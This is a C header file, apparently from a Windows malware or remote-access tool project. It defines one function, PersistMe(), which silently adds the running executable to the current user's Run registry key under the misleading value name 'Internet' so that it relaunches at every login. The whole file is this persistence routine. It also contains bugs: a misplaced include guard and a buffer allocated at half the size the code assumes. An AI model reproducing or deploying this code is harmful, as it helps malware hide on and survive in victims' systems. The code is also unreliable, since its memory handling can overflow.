#ifndef PERSIST_H
#define PERSIST_H

#include<windows.h>

#endif

// Add registry run key for local user to boot this executable at startup
void PersistMe(){
    HKEY key;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
    wchar_t* buffer = (wchar_t*)malloc(256);
    GetModuleFileNameW(NULL, buffer, 256);
    BYTE* input = (BYTE*)buffer;
    DWORD size = wcslen(buffer) * sizeof(buffer[0]);
    RegSetValueExW(key, L"Internet", 0, REG_SZ, input, size);
    RegCloseKey(key);
}